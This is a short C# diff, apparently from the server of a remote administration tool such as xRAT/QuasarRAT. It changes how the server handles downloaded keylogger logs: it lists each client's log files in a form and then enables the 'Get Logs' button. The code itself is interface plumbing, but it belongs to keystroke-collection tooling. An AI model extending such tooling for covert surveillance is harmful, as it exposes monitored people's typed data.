@@ -335,12 +335,26 @@ namespace xServer.Core.Commands
 
             destFile.AppendBlock(packet.Block, packet.CurrentBlock);
 
-            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
+            if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
             {
-                client.Value.FrmKl.Invoke((MethodInvoker) delegate
+                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\")).GetFiles();
+
+                if (iFiles.Length == 0)
+                    return;
+
+                foreach (FileInfo file in iFiles)
                 {
-                    if (packet.Index == packet.FileCount)
-                        client.Value.FrmKl.btnGetLogs.Enabled = true;
+                    var file1 = file;
+                    client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmKl.lstLogs.Items.Add(new ListViewItem().Text = file1.Name);
+
+                    });
+                }
+
+                client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
                 });
             }
         }
